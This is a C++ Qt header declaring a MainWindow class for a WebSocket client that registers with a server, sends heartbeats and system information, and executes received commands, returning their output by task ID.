#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QWebSocket>
#include <QTimer>
#include <QUuid>

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();

    QString getComputerName();
    QString getLocalIPAddress();
    QString generateUuid();
    QString getOrCreateMachineFingerprint();
    QString generateMachineFingerprint();
    QJsonArray getClientCapabilities();
    QJsonObject getSystemInformation();
    void sendRegistration();
    void sendHeartbeat();
    void sendCapabilityReport();
    void executeCommand(const QString& command, const QString& taskId);
    void sendCommandOutput(const QString& taskId, const QString& output);
    void sendErrorResponse(const QString& taskId, const QString& errorMessage);

public slots:
    void onConnected();
    void onMessageReceived(const QString& strMessage);
    void onDisconnected();
    void onError(QAbstractSocket::SocketError socketError);
    void onHeartbeatTimer();

private:
    QWebSocket m_webSocket;
    QString m_clientUuid;
    QString m_machineFingerprint;
    QTimer *m_heartbeatTimer;
    bool m_isRegistered;
};
#endif // MAINWINDOW_H